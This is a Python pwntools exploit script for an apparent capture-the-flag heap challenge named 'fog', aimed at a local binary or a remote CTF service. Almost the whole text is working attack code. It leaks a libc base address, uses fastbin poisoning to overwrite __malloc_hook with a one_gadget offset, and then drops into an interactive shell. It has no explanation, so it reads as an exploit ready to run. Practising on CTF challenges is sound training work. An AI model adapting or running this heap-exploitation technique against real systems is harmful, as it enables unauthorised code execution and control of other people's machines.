import sys
from pwn import *
from ctypes import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./fog')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./fog')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
		else :
			io=remote('nc.eonew.cn',10006)
			elf=ELF('./fog')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

		def add(a,c):
			io.sendlineafter('Your choice?','1')
			io.sendlineafter('What size do you want?',str(a))
			io.sendafter('Content: ',c)

		def delete(a):
			io.sendlineafter('Your choice?','2')
			io.sendlineafter('Which one do you want to delete?',str(a))

		def edit(a,c):
			io.sendlineafter('Your choice?','3')
			io.sendlineafter('Which one do you want to modify?',str(a))
			io.sendafter('What do you want to input?',c)

		def show(a):
			io.sendlineafter('Your choice?','4')
			io.sendlineafter('Which one do you want to see?',str(a))
		


		add(0x68,'aaaaa')
		add(0x68,'\x00'*0x60+p64(0xe0))
		io.sendlineafter('Your choice?','5')
		io.sendlineafter('Your choice?','6')
		io.sendlineafter('Your choice?','1')
		io.sendlineafter('What size do you want?',str(0x100))
		show(2)
		io.recvuntil('t : ')
		libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-632-0x10
		libc.address=libc_base
		io.sendlineafter('Your choice?','6')
		add(0x68,'aaaaa')
		delete(2)
		delete(1)
		delete(3)
		add(0x68,p64(libc.sym['__malloc_hook']-0x23))
		add(0x68,p64(libc.sym['__malloc_hook']-0x23))
		add(0x68,p64(libc.sym['__malloc_hook']-0x23))
		add(0x68,'\x00'*0x13+p64(libc_base+0x4526a))




		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive('>.<_keer_>.< => ')

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue